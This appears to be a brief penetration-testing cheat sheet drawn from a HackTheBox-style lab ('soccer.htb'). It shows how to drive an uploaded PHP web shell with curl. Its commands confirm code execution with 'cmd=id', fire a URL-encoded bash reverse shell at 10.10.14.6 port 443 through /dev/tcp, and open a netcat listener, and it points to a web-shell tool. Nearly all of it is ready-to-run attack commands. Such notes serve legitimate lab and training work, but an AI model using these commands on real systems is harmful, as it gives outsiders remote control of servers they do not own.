## curl
- After uploading a shell.php, you need to know where the shell is uploaded and you can execute the following commands
- First one is to confirm you have RCE (in the case below, the cmd.php is uploaded)

```jsx
oxdf@hacky$ curl <http://soccer.htb/tiny/uploads/cmd.php> -d 'cmd=id'
```

- Second one is to execute a reverse shell back to our host machine

```jsx
oxdf@hacky$ curl <http://soccer.htb/tiny/uploads/cmd.php> -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'
```

- Open a netcat listener on port 443

```jsx
oxdf@hacky$ nc -lnvp 443
```

Check out https://github.com/epinna/weevely3 as well
